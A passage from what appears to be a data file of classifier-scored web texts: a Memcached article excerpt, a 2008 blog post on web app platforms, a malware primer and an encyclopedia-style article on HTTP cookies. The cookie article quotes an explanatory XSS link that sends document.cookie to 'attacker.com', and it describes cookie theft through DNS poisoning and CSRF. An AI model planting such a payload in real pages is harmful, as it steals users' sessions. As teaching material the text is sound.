throwing out machines every six months, replacing them with bigger machines. Prior to Memcached, our Web nodes unconditionally hit our databases. This worked, but it wasn't as optimal as it could've been. I realized that even with 4G or 8G of memory, our database server caches were limited, both in raw memory size and by the address space available to our database server processes running on 32-bit machines. Yes, I could've replaced all our databases with 64-bit machines with much more memory, but recall that I'm stubborn and frugal. I wanted to cache more on our Web nodes. Unfortunately, because we're using mod_perl 1.x, caching is a pain. Each process and thus, each Web request, is in its own address space and can't share data with the others. Each of the 30–50 processes could cache on its own, but doing so would be wasteful. System V shared memory has too many weird limitations and isn't portable. It also works only on a single machine, not across 40+ Web nodes. These issues reflect what I saw as the main problem with most caching solutions. Even if our application platform was multithreaded with data easily shared between processes, we still could cache on only a single machine. I didn't want all 40+ machines caching independently and duplicating information. |Using Salt Stack and Vagrant for Drupal Development||May 20, 2013| |Making Linux and Android Get Along (It's Not as Hard as It Sounds)||May 16, 2013| |Drupal Is a Framework: Why Everyone Needs to Understand This||May 15, 2013| |Home, My Backup Data Center||May 13, 2013| |Non-Linux FOSS: Seashore||May 10, 2013| |Trying to Tame the Tablet||May 08, 2013| - RSS Feeds - Making Linux and Android Get Along (It's Not as Hard as It Sounds) - New Products - Drupal Is a Framework: Why Everyone Needs to Understand This - A Topic for Discussion - Open Source Feature-Richness? - Home, My Backup Data Center - Validate an E-Mail Address with PHP, the Right Way - Tech Tip: Really Simple HTTP Server with Python - New Products - Trying to Tame the Tablet - git-annex assistant 5 hours 37 min ago - direct cable connection 5 hours 59 min ago - Agreed on AirDroid. With my 6 hours 10 min ago - I just learned this 6 hours 14 min ago 6 hours 44 min ago - not living upto the mobile revolution 9 hours 35 min ago - Deceptive Advertising and 10 hours 11 min ago - Let\\'s declare that you have 10 hours 12 min ago - Alterations in Contest Due 10 hours 13 min ago - At a numbers mindset, your 10 hours 14 min ago Enter to Win an Adafruit Prototyping Pi Plate Kit for Raspberry Pi It's Raspberry Pi month at Linux Journal. Each week in May, Adafruit will be giving away a Pi-related prize to a lucky, randomly drawn LJ reader. Winners will be announced weekly. Fill out the fields below to enter to win this week's prize-- a Prototyping Pi Plate Kit for Raspberry Pi. Congratulations to our winners so far: - 5-8-13, Pi Starter Pack: Jack Davis - 5-15-13, Pi Model B 512MB RAM: Patrick Dunn - Next winner announced on 5-21-13! Free Webinar: Linux Backup and Recovery Most companies incorporate backup procedures for critical data, which can be restored quickly if a loss occurs. However, fewer companies are prepared for catastrophic system failures, in which they lose all data, the entire operating system, applications, settings, patches and more, reducing their system(s) to “bare metal.” After all, before data can be restored to a system, there must be a system to restore it to. In this one hour webinar, learn how to enhance your existing backup strategies for better disaster recovery preparedness using Storix System Backup Administrator (SBAdmin), a highly flexible bare-metal recovery solution for UNIX and Linux systems.",
        "prob": "tensor([[0.1633, 0.8367]])"
    },
    {
        "text": "What is a web application? By \"web applications\", I mean interactive programs which run on any platform, and use, process or (often) display data available on a server. One important characteristic of such applications is that they run within the browser. Doing so has several important implications -- most of them security related. Web applications can only connect to the server they came from. If that weren't the case, I could create a web page with the \"small\" side effect of getting unaware visiting users to launch Denial Of Service attacks against anybody. Also, an application that runs within the browser can't access directly the local hardware and file system in order to prevent viruses and spyware. Loser #1: Java Java was created by Sun Microsystems, and -- most importantly -- was included in Netscape Navigator in 1995. That's 13 years ago! Java uses a virtual machine; this means that Java programs will run anywhere as long as a Java virtual machine is available. Java allows developers to create \"Java applets\" and \"Java applications\". The main difference is security (see the textbox): Java applets are expected to be found embedded in web pages, rather than installed, and therefore don't have full access to the underlying hardware. In 2008, I don't remember having seen a web page which included a Java applet for at least 5 years. Java has its niche markets: Java Server Pages (to create web applications ala PHP) and mobile devices (to create small applications). Android will probably push Java further (although it only uses Java as a language, rather than using the Java Virtual Machine). However, again, Java is nowhere to be seen in web pages. Why? Because for the first 12 years of its life, Java's been proprietary. (Things are changing now. \"Too little, too late\".) Courageous people tried to write free, competing virtual machines, and managed. However, the problem was in the important Java libraries which Sun kept under a closed license for years and years and years. I am convinced that this problem also had technical repercussions on Java as a platform: Java applet were famous for crashing people's browsers in 1995 -- and they are still famous today for being immensely heavy and memory-hungry. I can only wonder how much better Java would be if the whole community were able to improve it and its libraries. Many also argue that the Java Virtual Machine -- and Java as a language -- is hardly fixable: the post I hate Java summarises some of the problems. (But, it is biased!) So, Java had all of the ingredients to become king in the web application domain: it was first, it was available in Windows and GNU/Linux, and it was ready. And yet, it was a closed platform and it had arguably big technical problems. Loser #2: Flash Just like Java, Flash was available very early, in 1997. Web authors could develop nice animations and more. It was better than Java (it didn't kill your browser) and it was easier to program. Fast-forward 11 years: Flash's main use is in video playing, and very little more. Adobe (which owns Flash) realised the potential of internet applications, and (about three years ago) released Flex. Flex, in oversimplifying terms, can be seen as a way for developers to create Flash files, using advanced libraries and advanced tools. Flex is absolutely fantastic. The problem is that while the Flash player is \"free\" (that is, it doesn't cost anything although its source code is not available), Flex is outrageously expensive. And proprietary. [UPDATE: no, it's not expensive. It's been open sourced, and you don't need a Flex server to deploy Flex applications -- thanks Ben Forta!] And it creates applications running in a proprietary player (Flash). I have seen Flex. I have met some of the programmers who worked on it. They knew what they were doing. They were smart. They knew the internet -- I considered them internet magicians. However, nobody likes to fork out large sums of money in order to buy (or deploy) the development tools [UPDATE: this is no longer an issue], and nobody likes the idea of depending completely on the financial health and ethical principles of a single company. I think Flash and Flex are way superior to anything I have ever seen. If the Flash player were released under the GPL, its specifications fully documented [Note: this is still absolutely crucial], and Flex was released under a free license (maybe BSD-like?), then there could be a big chance of a huge market shift towards Adobe's technologies. Trouble is, it's not going to happen -- and it might even be too late. Loser #3: Silverlight .NET is Microsoft's answer to Java: it compiles things into bytecode, it's multi-platform, etc. Technically, many argue that it's \"Java as it should have been\". .NET isn't free: while the virtual machine and the language itself are ECMA standards, Microsoft's GUI libraries and other key components aren't. This means (surprise surprise) that you can't write a .NET program for Microsoft Windows, and run it under GNU/Linux, even though there is a .NET virtual machine for GNU/Linux (called \"Mono\"). If .NET is Microsoft's answer to Java, Silverlight is Microsoft's answer to Flash. Silverlight allows you to run .NET applications within your browser. The site silverlight.net is Silverlight's official web page. Although it's defined \"Multi platform\" by Microsoft itself, GNU/Linux is completely ignored (there are Windows and Apple downloads). Silverlight might erode Flash's tiny market. I don't think there's any difference between Flash and Silverlight: two competing products which are losing the Web Application race. Why did such an unlikely combination win such an important war? Because it's based on available, open, free technologies. People don't have to spend thousands of dollars to write Flex applications. People don't have to install Microsoft Visual Studio for Silverlight. And don't have to battle the technical difficulties of Java (if it were still an option). Welcome to 2008.",
        "prob": "tensor([[5.7436e-06, 9.9999e-01]])"
    },
    {
        "text": "Types of attacks your computer may suffer from on the net If you surf the internet on a regular basis, then you must realize that your computer gets exposed to a variety of threats from the internet. Viruses, spyware, worms, and malware, everything is waiting to skim through your PC, scanning its contents and altering its components. Even more dangerous are hackers, who primarily target the sensitive data stored in your PC, including your e-mail passwords, and most importantly, your credit card numbers that you may provide to secure websites when purchasing something through online stores. Let us look into these threats individually: - Viruses – Computer viruses have always been the cause for alarm among PC users. Viruses work in different ways; some can slow down your PC to a crawl, others can wipe out data from your hard drive, corrupt system files and generally wreck havoc on your PC. Viruses are very dangerous, and you should always install some good antivirus software on your PC and keep it updated regularly. Scan your PC with this regularly to make sure that it is free from viruses and if not, learn how to find out which virus is on your computer. - Worms – These are not anywhere near viruses in danger factor, but can be pretty annoying. These malicious bits of software can stay resident in the memory, thereby slowing down your PC, sapping away RAM, interfering with the speed of your internet connection, and what not. What’s worse is that these often have a nasty habit of sending e-mails to every contact in your address book. Not a good thing. However, a good quality antivirus will be able to keep most worms at bay. - Spyware – These are small bits of malicious software that usually infiltrate your PC through certain websites. These usually get installed without user intervention, which means that you will not even know when your PC is getting infected by a spyware, unless you receive a intrusion warning message from your antivirus or firewall. Spywares can be dangerous when these enter your PC, because these can act as keyloggers, tapping into your key presses and sending information about those through the internet to the people who created the spyware in the first place. - Malware – These are similar to spyware, in that these often have similar ways of working. The main difference is that these usually pose a very innocent face up front, so in most cases, you will be installing these programs inadvertently in your PC. Your PC has to withstand many attacks in the form of one or more of these threats on a regular basis, whenever you are connected to the internet. Keep a good firewall and antivirus installed in your PC, to make sure that the dangerous denizens of the Internet leave your PC alone. Related article: Malicious programs descriptions Old drivers harm system performance and make your PC vulnerable to errors and crashes. Posted in Internet Security",
        "prob": "tensor([[2.0527e-06, 1.0000e+00]])"
    },
    {
        "text": "A cookie, also known as an HTTP cookie, web cookie, or browser cookie, is a small piece of data sent from a website and stored in a user's web browser while a user is browsing a website. When the user browses the same website in the future, the data stored in the cookie can be retrieved by the website to notify the website of the user's previous activity. Cookies were designed to be a reliable mechanism for websites to remember the state of the website or activity the user had taken in the past. This can include clicking particular buttons, logging in, or a record of which pages were visited by the user even months or years ago. Although cookies cannot carry viruses, and cannot install malware on the host computer, tracking cookies and especially third-party tracking cookies are commonly used as ways to compile long-term records of individuals' browsing histories — a major privacy concern that prompted European and US law makers to take action in 2011. Cookies can also store passwords and forms a user has previously entered, such as a credit card number or an address. When a user accesses a Web site with a cookie function for the first time, a cookie is sent from server to the browser and stored with the browser in the local computer. Later when that user goes back to the same website, the website will recognize the user because of the stored cookie with the user's information. Other kinds of cookies perform essential functions in the modern Web. Perhaps most importantly, authentication cookies are the most common method used by web servers to know whether the user is logged in or not, and which account they are logged in under. Without such a mechanism, the site would not know whether to send a page containing sensitive information, or require the user to authenticate himself by logging in. The security of an authentication cookie generally depends on the security of the issuing website and the user's web browser, and on whether the cookie data is encrypted. Security vulnerabilities may allow a cookie's data to be read by a hacker, used to gain access to user data, or used to gain access (with the user's credentials) to the website to which the cookie belongs (see cross-site scripting and cross-site request forgery for examples). The term \"cookie\" was derived from \"magic cookie\", which is the packet of data a program receives and sends again unchanged. Magic cookies were already used in computing when computer programmer Lou Montulli had the idea of using them in Web communications in June 1994. At the time, he was an employee of Netscape Communications, which was developing the e-commerce application \"MCI Mall\" for MCI. Vint Cerf and John Klensin represented MCI in technical discussions with Netscape Communications. Not wanting the MCI Mall servers to have to retain partial transaction states led to MCI's request to Netscape to find a way to store that state in each user's computer. Cookies provided a solution to the problem of reliably implementing a virtual shopping cart. The introduction of cookies was not widely known to the public at the time. In particular, cookies were accepted by default, and users were not notified of the presence of cookies. The general public learned about them after the Financial Times published an article about them on February 12, 1996. In the same year, cookies received a lot of media attention, especially because of potential privacy implications. Cookies were discussed in two U.S. Federal Trade Commission hearings in 1996 and 1997. The development of the formal cookie specifications was already ongoing. In particular, the first discussions about a formal specification started in April 1995 on the www-talk mailing list. A special working group within the IETF was formed. Two alternative proposals for introducing state in HTTP transactions had been proposed by Brian Behlendorf and David Kristol respectively, but the group, headed by Kristol himself and Aron Afatsuom, soon decided to use the Netscape specification as a starting point. In February 1996, the working group identified third-party cookies as a considerable privacy threat. The specification produced by the group was eventually published as RFC 2109 in February 1997. It specifies that third-party cookies were either not allowed at all, or at least not enabled by default. At this time, advertising companies were already using third-party cookies. The recommendation about third-party cookies of RFC 2109 was not followed by Netscape and Internet Explorer. RFC 2109 was superseded by RFC 2965 in October 2000. A definitive specification for cookies as used in the real world was published as RFC 6265 in April 2011. ||This section needs additional citations for verification. (August 2011)| A user's session cookie (also known as an in-memory cookie or transient cookie) for a website exists in temporary memory only while the user is reading and navigating the website. When an expiry date or validity interval is not set at cookie creation time, a session cookie is created. Web browsers normally delete session cookies when the user closes the browser. A persistent cookie will outlast user sessions. If a persistent cookie has its Max-Age set to 1 year, then, within the year, the initial value set in that cookie would be sent back to the server every time the user visited the server. This could be used to record a vital piece of information such as how the user initially came to this website. For this reason persistent cookies are also called tracking cookies. A secure cookie has the secure attribute enabled and is only used via HTTPS, ensuring that the cookie is always encrypted when transmitting from client to server. This makes the cookie less likely to be exposed to cookie theft via eavesdropping. First-party cookies are cookies set with the same domain (or its subdomain) as your browser's address bar. Third-party cookies are cookies set with domains different from the one shown on the address bar. The web pages on the first domain may feature content from a third-party domain, e.g. a banner advert run by www.advexample.com. Privacy setting options in most modern browsers allow you to block third-party tracking cookies. As an example, suppose a user visits www.example1.com, which includes an advert which sets a cookie with the domain ad.foxytracking.com. When the user later visits www.example2.com, another advert can set another cookie with the domain ad.foxytracking.com. Eventually, both of these cookies will be sent to the advertiser when loading their ads or visiting their website. The advertiser can then use these cookies to build up a browsing history of the user across all the websites this advertiser has footprints on. A \"supercookie\" is a cookie with an origin of a Top-Level Domain (TLD) or an effective Top-Level Domain. Some domains that are considered, \"Top-Level\" may in fact be a secondary or lower-level domain. For example, k12.ca.us are considered Top-Level even though they are multiple levels deep. These domains are referred to as Public Suffixes and are not open for reservation by end-users. Most browsers, by default, allow first-party cookies—a cookie with domain to be the same or sub-domain of the requesting host. For example, a user visiting www.example.com can have a cookie set with domain .example.com. A so-called \"supercookie\" is a cookie originating from a Public Suffix or Top-Level Domain such as, .com. It is important that these cookies are blocked by browsers otherwise, an attacker in control of malicious website with domain .com could set a \"supercookie\" and potentially disrupt or impersonate legitimate user requests to example.com. Thus taking advantage of the fact that .com can set valid cookies for sub-domain The Public Suffix List is a cross-vendor initiative to provide an accurate list of domain name suffixes changing. Older versions of browsers may not have the most up-to-date list, and will therefore be vulnerable to supercookies from certain domains. The term \"supercookie\" is sometimes used for tracking technologies that do not rely on HTTP cookies. Two such \"supercookie\" mechanisms were found on Microsoft websites: cookie syncing that respawned MUID cookies, and ETag cookies. Due to media attention, Microsoft later disabled this code: In response to recent attention on \"supercookies\" in the media, we wanted to share more detail on the immediate action we took to address this issue, as well as affirm our commitment to the privacy of our customers. According to researchers, including Jonathan Mayer at Stanford University, \"supercookies\" are capable of re-creating users' cookies or other identifiers after people deleted regular cookies. Mr. Mayer identified Microsoft as one among others that had this code, and when he brought his findings to our attention we promptly investigated. We determined that the cookie behavior he observed was occurring under certain circumstances as a result of older code that was used only on our own sites, and was already scheduled to be discontinued. We accelerated this process and quickly disabled this code. At no time did this functionality cause Microsoft cookie identifiers or data associated with those identifiers to be shared outside of Microsoft.—Mike Hintze Some cookies are automatically recreated after a user has deleted them; these are called zombie cookies. This is accomplished by a script storing the content of the cookie in some other locations, such as the local storage available to Flash content, HTML5 storages and other client side mechanisms, and then recreating the cookie from backup stores when the cookie's absence is detected. 1. Name of the cookie 2. Value of the cookie 3. The expiry of the cookie (using Greenwich Mean Time) 4. The path the cookie is good for 5. The domain the cookie is good for 6. The need for a secure connection to use the cookie Only the first two parameters are required for the successful operation of the cookie. Session management Cookies may be used to maintain data related to the user during navigation, possibly across multiple visits. Cookies were introduced to provide a way to implement a \"shopping cart\" (or \"shopping basket\"), a virtual device into which users can store items they want to purchase as they navigate throughout the site. Shopping basket applications today usually store the list of basket contents in a database on the server side, rather than storing basket items in the cookie itself. A web server typically sends a cookie containing a unique session identifier. The web browser will send back that session identifier with each subsequent request and shopping basket items are stored associated with a unique session identifier. Cookies provide a quick and convenient means of client/server interaction. One of the advantages of cookies lies in the fact that they store the user information locally while identifying users simply based on cookie matching. The server's storage and retrieval load is greatly reduced. As a matter of fact, the possibility of applications is endless - anytime personal data need to be saved they can be saved as a cookie (Kington, 1997). Cookies may be used to remember the information about the user who has visited a website in order to show relevant content in the future. For example a web server may send a cookie containing the username last used to log into a website so that it may be filled in for future visits. Tracking cookies may be used to track internet users' web browsing. This can also be done in part by using the IP address of the computer requesting the page or the referrer field of the HTTP request header, but cookies allow for greater precision. This can be demonstrated as follows: - If the user requests a page of the site, but the request contains no cookie, the server presumes that this is the first page visited by the user; the server creates a random string and sends it as a cookie back to the browser together with the requested page; - From this point on, the cookie will automatically be sent by the browser to the server every time a new page from the site is requested; the server sends the page as usual, but also stores the URL of the requested page, the date/time of the request, and the cookie in a log file. By analyzing the log file collected in the process, it is then possible to find out which pages the user has visited, in what sequence, and for how long. Cookie specifications suggest that browsers should be able to save and send back a minimal number of cookies. In particular, a web browser is expected to be able to store at least 300 cookies of four kilobytes each, and at least 20 cookies per server or domain. Transfer of Web pages follows the HyperText Transfer Protocol (HTTP). Regardless of cookies, browsers request a page from web servers by sending them a usually short text called HTTP request. For example, to access the page http://www.example.org/index.html, browsers connect to the server www.example.org sending it a request that looks like the following one: The server replies by sending the requested page preceded by a similar packet of text, called 'HTTP response'. This packet may contain lines requesting the browser to store cookies: The server sends lines of Set-Cookie only if the server wishes the browser to store cookies. Set-Cookie is a directive for the browser to store the cookie and send it back in future requests to the server (subject to expiration time or other cookie attributes), if the browser supports cookies and cookies are enabled. For example, the browser requests the page http://www.example.org/spec.html by sending the server www.example.org a request like the following: This is a request for another page from the same server, and differs from the first one above because it contains the string that the server has previously sent to the browser. This way, the server knows that this request is related to the previous one. The server answers by sending the requested page, possibly adding other cookies as well. The value of a cookie can be modified by the server by sending a new Set-Cookie: name=newvalue line in response of a page request. The browser then replaces the old value with the new one. The value of a cookie may consist of any printable ascii character ( ; and excluding whitespace. The name of the cookie also excludes = as that is the delimiter between the name and value. The cookie standard RFC2965 is more limiting but not implemented by browsers. The term \"cookie crumb\" is sometimes used to refer to the name-value pair. This is not the same as breadcrumb web navigation, which is the technique of showing in each page the list of pages the user has previously visited; this technique, however, may be implemented using cookies. document.cookie is used for this purpose. For example, the instruction document.cookie = \"temperature=20\" creates a cookie of name temperature and value Cookie attributes Besides the name–value pair, servers can also set these cookie attributes: a cookie domain, a path, expiration time or maximum age, Secure flag and HttpOnly flag. Browsers will not send cookie attributes back to the server. They will only send the cookie’s name-value pair. Cookie attributes are used by browsers to determine when to delete a cookie, block a cookie or whether to send a cookie (name-value pair) to the servers. Domain and Path The cookie domain and path define the scope of the cookie—they tell the browser that cookies should only be sent back to the server for the given domain and path. If not specified, they default to the domain and path of the object that was requested. An example of Set-Cookie directives from a website after a user logged in: The first cookie LSID has default domain docs.foo.com and Path /accounts, which tells the browser to use the cookie only when requesting pages contained in docs.foo.com/accounts. The other 2 cookies SSID would be sent back by the browser while requesting any subdomain in .foo.com on any path, for example Cookies can only be set on the top domain and its sub domains. Setting cookies on www.bar.com will not work for security reasons. Expires and Max-Age The Expires directive tells the browser when to delete the cookie. Derived from the format used in RFC 1123, the date is specified in the form of “Wdy, DD Mon YYYY HH:MM:SS GMT”, indicating the exact date/time this cookie will expire. As an alternative to setting cookie expiration as an absolute date/time, RFC 6265 allows the use of the Max-Age attribute to set the cookie’s expiration as an interval of seconds in the future, relative to the time the browser received the cookie. An example of Set-Cookie directives from a website after a user logged in: The first cookie lu is set to expire sometime in 15-Jan-2013; it will be used by the client browser until that time. The second cookie made_write_conn does not have an expiration date, making it a session cookie. It will be deleted after the user closes their browser. The third cookie reg_fb_gate has its value changed to deleted, with an expiration time in the past. The browser will delete this cookie right away – note that cookie will only be deleted when the domain and path attributes in the Set-Cookie field match the values used when the cookie was created. Secure and HttpOnly The Secure and HttpOnly attributes do not have associated values. Rather, the presence of the attribute names indicates that the Secure and HttpOnly behaviors are specified. Browser settings Most modern browsers support cookies and allow the user to disable them. The following are common options: - To enable or disable cookies completely, so that they are always accepted or always blocked. - Some browsers incorporate a cookie manager for the user to see and selectively delete the cookies currently stored in the browser. - By default, Internet Explorer allows only third-party cookies that are accompanied by a P3P \"CP\" (Compact Policy) field. Advertising companies use third-party cookies to track a user across multiple sites. In particular, an advertising company can track a user across all pages where it has placed advertising images or web bugs. Knowledge of the pages visited by a user allows the advertising company to target advertisements to the user's presumed preferences. The possibility of building a profile of users is considered by some a potential privacy threat, especially when tracking is done across multiple domains using third-party cookies. For this reason, some countries have legislation about cookies. The United States government has set strict rules on setting cookies in 2000 after it was disclosed that the White House drug policy office used cookies to track computer users viewing its online anti-drug advertising. In 2002, privacy activist Daniel Brandt found that the CIA had been leaving persistent cookies on computers which had visited its website. When notified it was violating policy, CIA stated that these cookies were not intentionally set and stopped setting them. On December 25, 2005, Brandt discovered that the National Security Agency (NSA) had been leaving two persistent cookies on visitors' computers due to a software upgrade. After being informed, the National Security Agency immediately disabled the cookies. EU Cookie Law In 2002, the European Union launched the Directive on Privacy and Electronic Communications, a policy requiring end users’ consent for the placement of cookies, and similar technologies for storing and accessing information on users’ equipment. In particular, Article 5 Paragraph 3 mandates that storing data in a user’s computer can only be done if the user is provided information about how this data is used, and the user is given the possibility of denying this storing operation. Directive 95/46/EC defines ‘the data subject’s consent’ as: “any freely given specific and informed indication of his wishes by which the data subject signifies his agreement to personal data relating to him being processed”. Consent must involve some form of communication where individuals knowingly indicate their acceptance. In 2009, the policy was amended by Directive 2009/136/EC, which included a change to Article 5 Paragraph 3. Instead of having an option for users to opt out of cookie storage, the revised Directive requires consent to be obtained for cookie storage. In June 2012, European data protection authorities adopted an opinion which clarifies that some cookie users might be exempt from the requirement to gain consent: - Some cookies can be exempted from informed consent under certain conditions if they are not used for additional purposes. These cookies include cookies used to keep track of a user’s input when filling online forms or as a shopping cart. - First party analytics cookies are not likely to create a privacy risk if websites provide clear information about the cookies to users and privacy safeguards. The industry’s response has been largely negative. Some viewed the Directive as an infernal doomsday machine that will \"kill online sales\" and \"kill the internet\". Robert Bond of the law firm Speechly Bircham describes the effects as \"far-reaching and incredibly onerous\" for \"all UK companies.\" Simon Davis of Privacy International argues that proper enforcement would \"destroy the entire industry.\" Third-party cookies can be blocked by most browsers to increase privacy and reduce tracking by advertising and tracking companies without negatively affecting the user's Web experience. Many advertising operators have an opt-out option to behavioural advertising, with a generic cookie in the browser stopping behavioural advertising. Cookie theft and session hijacking ||This section has multiple issues. Please help improve it or discuss these issues on the talk page. Listed here are various scenarios of cookie theft and user session hijacking (even without stealing user cookies) which work with websites which rely solely on HTTP cookies for user identification. Network eavesdropping Traffic on a network can be intercepted and read by computers on the network other than the sender and receiver (particularly over unencrypted open Wi-Fi). This traffic includes cookies sent on ordinary unencrypted HTTP sessions. Where network traffic is not encrypted, attackers can therefore read the communications of other users on the network, including HTTP cookies as well as the entire contents of the conversations, for the purpose of a man-in-the-middle attack. An attacker could use intercepted cookies to impersonate a user and perform a malicious task, such as transferring money out of the victim’s bank account. This issue can be resolved by securing the communication between the user's computer and the server by employing Transport Layer Security (HTTPS protocol) to encrypt the connection. A server can specify the Secure flag while setting a cookie, which will cause the browser to send the cookie only over an encrypted channel, such as an SSL connection. Publishing false sub-domain – DNS cache poisoning Via DNS cache poisoning, an attacker might be able to cause a DNS server to cache a fabricated DNS entry, say f12345.www.example.com with the attacker’s server IP address. The attacker can then post an image URL from his own server (for example, http://f12345.www.example.com/img_4_cookie.jpg). Victims reading the attacker’s message would download this image from f12345.www.example.com is a sub-domain of www.example.com, victims’ browsers would submit all example.com-related cookies to the attacker’s server; the compromised cookies would also include HttpOnly cookies.[clarification needed] This vulnerability is usually for Internet Service Providers to fix, by securing their DNS servers. But it can also be mitigated if www.example.com is using Secure cookies. Victims’ browsers will not submit Secure cookies if the attacker’s image is not using encrypted connections. If the attacker chose to use HTTPS for his img_4_cookie.jpg download, he would have the challenge of obtaining an SSL certificate for f12345.www.example.com from a Certificate Authority. Without a proper SSL certificate, victims’ browsers would display (usually very visible) warning messages about the invalid certificate, thus alerting victims as well as security officials from www.example.com (the latter would require someone to inform the security officials). As an example, an attacker may post a message on www.example.com with the following link: <a href=\"#\" onclick=\"window.location='http://attacker.com/stole.cgi?text='+escape(document.cookie); return false;\">Click here!</a> When another user clicks on this link, the browser executes the piece of code within the onclick attribute, thus replacing the string document.cookie with the list of cookies of the user that are active for the page. As a result, this list of cookies is sent to the attacker.com server. If the attacker’s posting is on https://www.example.com/somewhere, secure cookies will also be sent to attacker.com in plain text. Cross-site scripting is a constant threat, as there are always some crackers trying to find a way of slipping in script tags to websites. It is the responsibility of the website developers to filter out such malicious code. In the meantime, such attacks can be mitigated by using HttpOnly cookies. These cookies will not be accessible by client side script, and therefore, the attacker will not be able to gather these cookies. Cross-site scripting If an attacker was able to insert a piece of script to a page on www.example.com, and a victim’s browser was able to execute the script, the script could simply carry out the attack. This attack would use the victim’s browser to send HTTP requests to servers directly; therefore, the victim’s browser would submit all relevant cookies, including HttpOnly cookies, as well as Secure cookies if the script request is on HTTPS. For example, on MySpace, Samy posted a short message “Samy is my hero” on his profile, with a hidden script to send Samy a “friend request” and then post the same message on the victim’s profile. A user reading Samy’s profile would send Samy a “friend request” and post the same message on this person’s profile. Then, the third person reading the second person’s profile would do the same. Pretty soon, this Samy worm became one of the fastest spreading worms of all time. This type of attack (with automated scripts) would not work if a website had CAPTCHA to challenge client requests. Cross-site scripting – proxy request In older versions of browsers, there were security holes allowing attackers to script a proxy request by using XMLHttpRequest. For example, a victim is reading an attacker’s posting on www.example.com, and the attacker’s script is executed in the victim’s browser. The script generates a request to www.example.com with the proxy server attacker.com. Since the request is for example.com cookies will be sent along with the request, but routed through the attacker’s proxy server, hence, the attacker can harvest the victim’s cookies. This attack would not work for Secure cookie, since Secure cookies go with HTTPS connections, and its protocol dictates end-to-end encryption, i.e., the information is encrypted on the user’s browser and decrypted on the destination server www.example.com, so the proxy servers would only see encrypted bits and bytes. Cross-site request forgery For example, Bob might be browsing a chat forum where another user, Mallory, has posted a message. Suppose that Mallory has crafted an HTML image element that references an action on Bob's bank's website (rather than an image file), e.g., If Bob's bank keeps his authentication information in a cookie, and if the cookie hasn't expired, then the attempt by Bob's browser to load the image will submit the withdrawal form with his cookie, thus authorizing a transaction without Bob's approval. Besides privacy concerns, cookies also have some technical drawbacks. In particular, they do not always accurately identify users, they can be used for security attacks, and they are often at odds with the Representational State Transfer (REST) software architectural style. Inaccurate identification If more than one browser is used on a computer, each usually has a separate storage area for cookies. Hence cookies do not identify a person, but a combination of a user account, a computer, and a Web browser. Thus, anyone who uses multiple accounts, computers, or browsers has multiple sets of cookies. Likewise, cookies do not differentiate between multiple users who share the same user account, computer, and browser. Inconsistent state on client and server Inconsistent support by devices The problem with using mobile cookies is that most devices do not implement cookies; for example, Nokia only supports cookies on 60% of its devices, while Motorola only supports cookies on 45% of its phones. In addition, some gateways and networks (Verizon, Alltel, and MetroPCS) strip cookies, while other networks simulate cookies on behalf of their mobile devices. There are also dramatic variations in the wireless markets around the world; for example, in the United Kingdom 94% of the devices support wireless cookies, while in the United States only 47% support them. The support for cookies is greater in the Far East, where wireless devices are more commonly used to access the web. Mobile cookies is a practice already in place in Japan, so that whether watching a podcast, a video, TV, clicking on a loan calculator or a GPS map—on almost all wireless devices—cookies can be set for tracking and capturing wireless behaviors. Some of the operations that can be done using cookies can also be done using other mechanisms. IP address Some users may be tracked based on the IP address of the computer requesting the page. The server knows the IP address of the computer running the browser or the proxy, if any is used, and could theoretically link a user's session to this IP address. IP addresses are, generally, not a reliable way to track a session or identify a user. Many computers designed to be used by a single user, such as office PCs or home PCs, are behind a network address translator (NAT). This means that several PCs will share a public IP address. Furthermore, some systems, such as Tor, are designed to retain Internet anonymity, rendering tracking by IP address impractical, impossible, or a security risk. URL (query string) A more precise technique is based on embedding information into URLs. The query string part of the URL is the one that is typically used for this purpose, but other parts can be used as well. The Java Servlet and PHP session mechanisms both use this method if cookies are not enabled. This method consists of the Web server appending query strings to the links of a Web page it holds when sending it to a browser. When the user follows a link, the browser returns the attached query string to the server. Query strings used in this way and cookies are very similar, both being arbitrary pieces of information chosen by the server and sent back by the browser. However, there are some differences: since a query string is part of a URL, if that URL is later reused, the same attached piece of information is sent to the server. For example, if the preferences of a user are encoded in the query string of a URL and the user sends this URL to another user by e-mail, those preferences will be used for that other user as well. Moreover, even if the same user accesses the same page two times, there is no guarantee that the same query string is used in both views. For example, if the same user arrives to the same page but coming from a page internal to the site the first time and from an external search engine the second time, the relative query strings are typically different while the cookies would be the same. For more details, see query string. Other drawbacks of query strings are related to security: storing data that identifies a session in a query string enables or simplifies session fixation attacks, referrer logging attacks and other security exploits. Transferring session identifiers as HTTP cookies is more secure. Hidden form fields Another form of session tracking is to use web forms with hidden fields. This technique is very similar to using URL query strings to hold the information and has many of the same advantages and drawbacks; and if the form is handled with the HTTP GET method, the fields actually become part of the URL the browser will send upon form submission. But most forms are handled with HTTP POST, which causes the form information, including the hidden fields, to be appended as extra input that is neither part of the URL, nor of a cookie. This approach presents two advantages from the point of view of the tracker: first, having the tracking information placed in the HTML source and POST input rather than in the URL means it will not be noticed by the average user; second, the session information is not copied when the user copies the URL (to save the page on disk or send it via email, for example). This method can be easily used with any framework that supports web forms. The downside is that every separate window or tab will initially have an empty window.name; in times of tabbed browsing this means that individually opened tabs (initiation by user) will not have a window name. Furthermore window.name can be used for tracking visitors across different websites, making it of concern for Internet privacy. In some respects this can be more secure than cookies due to not involving the server, so it is not vulnerable to network cookie sniffing attacks. However if special measures are not taken to protect the data, it is vulnerable to other attacks because the data is available across different websites opened in the same window or tab. HTTP authentication The HTTP protocol includes the basic access authentication and the digest access authentication protocols, which allow access to a Web page only when the user has provided the correct username and password. If the server requires such credentials for granting access to a web page, the browser requests them from the user and, once obtained, the browser stores and sends them in every subsequent page request. This information can be used to track the user. See also - Dynamic HTML - Local Shared Object – Flash Cookies - Session Beans - Session (computer science) - Session ID - Web server session management - Web Storage and DOM Storage - Web visitor tracking - Zombie cookie - \"HTTP State Management Mechanism – Overview\". IETF. April 2011. - Penenberg, Adam; Cookie Monsters, Slate, November 7, 2005. \"Cookies are not software. They can't be programmed, can't carry viruses, and can't unleash malware to go wilding through your hard drive.\" - \"New net rules set to make cookies crumble\". BBC. 2011-03-08. - \"Sen. Rockefeller: Get Ready for a Real Do-Not-Track Bill for Online Advertising\". Adage.com. 2011-05-06. - Peng, Weihong; Cisna, Jennifer (2000). \"HTTP cookies - a promising technology\". Proquest. Online Information Review. Retrieved 29 March 2013. - Vamosi, Robert (2008-04-14). \"Gmail cookie stolen via Google Spreadsheets\". - Schwartz, John (2001-09-04). \"Giving Web a Memory Cost Its Users Privacy\". The New York Times. - Kesan, Jey; and Shah, Rajiv ; 